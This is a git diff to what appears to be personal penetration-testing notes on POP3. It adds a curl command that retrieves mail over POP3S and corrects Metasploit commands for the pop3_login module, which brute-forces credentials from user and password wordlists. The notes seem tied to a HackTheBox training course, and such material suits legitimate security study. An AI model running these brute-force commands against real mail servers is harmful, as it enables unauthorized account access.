@@ -25,6 +25,7 @@ STAT # find if there mails
 LIST # list new messages
 RETR 1 # retrieve the first message
 $ curl -k 'pop3s://IP' --user username:password
+$ curl -k 'pop3s://IP' [...] -X 'RETR 1'
 $ openssl s_client -connect IP:pop3s
 ```
 </div></div>
@@ -37,14 +38,16 @@ $ openssl s_client -connect IP:pop3s
 
 #### Foothold
 
+[![attacking_common_services](../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
+
 * You may try to use [brute force](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md):
 
 ```shell!
 $ msfconsole -q
-msf6> auxiliary/scanner/pop3/pop3_login
+msf6> use auxiliary/scanner/pop3/pop3_login
 msf6> set USER_FILE /path/to/users.lst
 msf6> set PASS_FILE /path/to/pass.lst
-msf6> setg RHOST IP
+msf6> setg RHOSTS IP
 msf6> run
 ```
 
